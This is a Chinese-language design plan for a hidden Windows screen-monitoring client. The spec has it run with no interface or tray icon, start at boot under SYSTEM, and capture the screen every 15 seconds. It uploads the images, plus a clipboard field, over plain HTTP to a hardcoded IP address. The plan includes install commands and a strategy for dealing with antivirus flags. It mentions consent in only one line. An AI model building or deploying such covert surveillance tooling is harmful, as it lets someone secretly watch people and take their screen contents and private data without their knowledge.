# C# 客户端开发方案（Windows 静默运行）

更新时间：2025-08-10

## 1. 目标与范围
- 平台：Windows 10/11（x64）
- 运行形态：静默运行，无界面、无托盘图标
- 开机自启：随系统开机自动启动
- 设备标识：首次从后端获取 UID（clientId），持久化本地；后续启动直接使用该 UID
- 上传机制：每 15 秒抓取屏幕截图，压缩为 JPG 后上传
- 心跳与在线状态：客户端定时上报心跳/状态
- 生产网络要求：不使用 HTTPS；生产使用域名+端口连接后端（当前测试 IP：206.119.177.133）
- 多显示器：不支持多屏合并（仅主屏）

## 2. 架构设计
- 宿主方式（优先级）：
  1) Windows Service（服务方式，随系统启动，稳定、无 UI）
  2) 备用：计划任务（开机触发，无需登录）
- 运行框架：.NET 8 Worker Service（Microsoft.Extensions.Hosting）
- 目标框架：`net8.0-windows`
- 组件：
  - HttpClient：REST API 请求
  - Socket.IO（可选/推荐用于心跳）：H.Socket.IO 或 SocketIoClientDotNet
  - 截图与压缩：System.Drawing + GDI CopyFromScreen（简单稳定）或 Windows.Graphics.Capture（Win10+）/ImageSharp
  - 日志：Serilog/NLog（文件滚动）
- 目录与持久化：
  - `%ProgramData%\ScreenMonitor\` 作为应用数据根目录
    - `client.json` 保存 `clientId`
    - `logs\client.log` 运行日志
    - `config\appsettings.json` 可选本地配置

## 3. 配置约定（默认值可调整）
- 后端 HTTP 基础地址（生产）
  - `BackendBaseUrl`: `http://<domain_or_ip>:3001/api`
  - 例：`http://206.119.177.133:3001/api`
- WebSocket 地址（如启用心跳 WS）
  - `WebSocketUrl`: `ws://<domain_or_ip>:3005/monitor`
  - 例：`ws://206.119.177.133:3005/monitor`
- 截图参数
  - `ScreenshotIntervalSeconds`: 15
  - `JpegQuality`: 60（0-100）
  - `MaxLongSide`: 1600（最长边像素，0 表示不缩放）
  - `MaxImageBytes`: 307200（尽力压缩在 300KB 以下）
- 重试与稳定性
  - `MaxRetry`: 3
  - `RetryBaseDelayMs`: 1000（指数退避基准）

示例 appsettings.json：
```json
{
  "App": {
    "BackendBaseUrl": "http://206.119.177.133:3001/api",
    "WebSocketUrl": "ws://206.119.177.133:3005/monitor",
    "ScreenshotIntervalSeconds": 15,
    "JpegQuality": 60,
    "MaxLongSide": 1600,
    "MaxRetry": 3,
    "RetryBaseDelayMs": 1000
  },
  "Logging": {
    "Path": "C:\\ProgramData\\ScreenMonitor\\logs\\client.log",
    "Level": "Information"
  }
}
```

## 4. 与后端的接口对接
- 客户端注册（首次获取 UID）
  - `POST /api/clients`
  - 请求体（建议字段）：
    - `clientNumber`: `WIN-{MachineName}-{FirstRunUnix}`
    - `clientName`: `Windows 客户端`
    - `computerName`: `Environment.MachineName`
    - `os`: `RuntimeInformation.OSDescription`
    - `version`: 客户端版本（如 `1.0.0`）
    - `remark`: 自定义描述（当前用户名等）
  - 响应：从全局包装器中容错解析 `data.id` 或 `data.data.id`
  - 本地持久化：`%ProgramData%\ScreenMonitor\client.json`

- 截图上传
  - `POST /api/security/screenshots/upload`
  - `multipart/form-data`：
    - `clientId`: string（本地保存的 UID）
    - `clipboardContent`: string（本期可留空）
    - `file`: JPG 二进制（文件名建议含时间戳）

- 心跳上报（两种实现，二选一或同时支持）
  1) WebSocket（推荐）：
     - 连接：`ws://<host>:3005/monitor`
     - 连接后：`emit('join-client-room', { clientId })`
     - 定时：`emit('client-heartbeat', { clientId, status: 'online', ip?, timestamp })`
  2) HTTP（可选扩展）：
     - 若后端增加 `POST /api/clients/heartbeat`，可走 HTTP 定时上报

## 5. 运行流程
1) 启动：
   - 读取 `client.json`，如无则调用注册接口获取并保存 `clientId`
   - （可选）建立 WebSocket 连接，加入房间并开始心跳
   - 启动定时任务：每 15 秒截图并上传
2) 截图任务：
   - 获取主屏图像（仅主屏）
   - 可选缩放到最长边 `MaxLongSide`
   - 以 `JpegQuality` 编码到内存流
   - 以 `multipart/form-data` 上传
   - 失败重试（指数退避），记录日志
3) 停止：
   - 释放 Timer/WS/HttpClient，记录最后日志

## 6. 关键实现细节
- Windows 服务宿主（Program.cs）
```csharp
Host.CreateDefaultBuilder(args)
    .UseWindowsService()
    .ConfigureServices((ctx, services) => {
        services.Configure<AppOptions>(ctx.Configuration.GetSection("App"));
        services.AddSingleton<IClientIdStore, FileClientIdStore>();
        services.AddHttpClient("api", c => c.BaseAddress = new Uri(ctx.Configuration["App:BackendBaseUrl"]!));
        services.AddHostedService<ScreenWorker>();
    })
    .Build()
    .Run();
```
- UID 持久化（FileClientIdStore）：读写 `%ProgramData%\ScreenMonitor\client.json`
- 截图（GDI）：`Graphics.CopyFromScreen` 获取主屏；`ImageCodecInfo` + `EncoderParameters` 设置 JPG 质量
- 上传：`MultipartFormDataContent` + `StreamContent`（Content-Type `image/jpeg`）
- 心跳（WS）：H.Socket.IO 连接成功后定时 `client-heartbeat`
- 自启：
  - 方案 A：安装 Windows Service（管理员）
  - 方案 B：`schtasks /create /sc onstart /ru SYSTEM` 创建计划任务

## 7. 日志与稳定性
- 日志按天滚动，保留 7-14 天
- 网络失败：最多重试 3 次，延迟 1s、2s、4s；超出后下一个周期再尝试
- 上传体积控制：JPG 质量=60，最长边=1600，目标 < 200KB/张（后续根据带宽调整）

## 8. 部署与运维
- 发布方式：`dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true`
- 安装：复制到 `C:\Program Files\ScreenMonitor\`，执行安装脚本：
  - 服务：`sc create ScreenMonitor binPath= "C:\\Program Files\\ScreenMonitor\\ScreenMonitor.Client.exe" start= auto`；`sc start ScreenMonitor`
  - 或计划任务：`schtasks /create /tn "ScreenMonitor" /sc onstart /ru SYSTEM /rl HIGHEST /tr "C:\\Program Files\\ScreenMonitor\\ScreenMonitor.Client.exe" /F`
- 日志位置：`%ProgramData%\ScreenMonitor\logs\client.log`
- 配置调整：`%ProgramData%\ScreenMonitor\config\appsettings.json`

## 9. 安全与合规
- 明文 HTTP（不使用 HTTPS），仅限受控网络环境；建议后续切换 HTTPS
- 上传内容仅为屏幕图像与最小元数据；如涉及 PII，需在告知与授权后部署

## 10. 里程碑与交付
- D1：项目骨架、配置、UID 持久化、服务宿主
- D2：截图与压缩、上传接口打通、重试与日志
- D3：开机自启（服务/计划任务）、安装脚本与文档
- D4：引入心跳（Socket.IO）、联调与性能调优
- 交付物：可执行程序、安装/卸载脚本、配置模板、运维手册、基础集成测试

## 11. 风险与备选
- 截图权限受限：改用 Windows.Graphics.Capture（需 Win10+ 权限）
- 杀软误报：添加签名与白名单申请
- 网络抖动：容错重试与状态退避

## 12. 开放问题（当前结论/待定）
- 多显示器：不考虑（当前仅主屏）
- 截图质量与体积：暂未严格上限，按默认参数先行，后续根据网络评估
- 心跳：需要；优先使用 Socket.IO（ws://206.119.177.133:3005/monitor），如需 HTTP 心跳可追加 API

---

## 附：与后端事件/接口对接摘要
- 注册：`POST /api/clients` → 持久化 `clientId`
- 截图上传：`POST /api/security/screenshots/upload`（multipart）
- WebSocket：`connect -> emit('join-client-room',{clientId}) -> 每30s emit('client-heartbeat')`


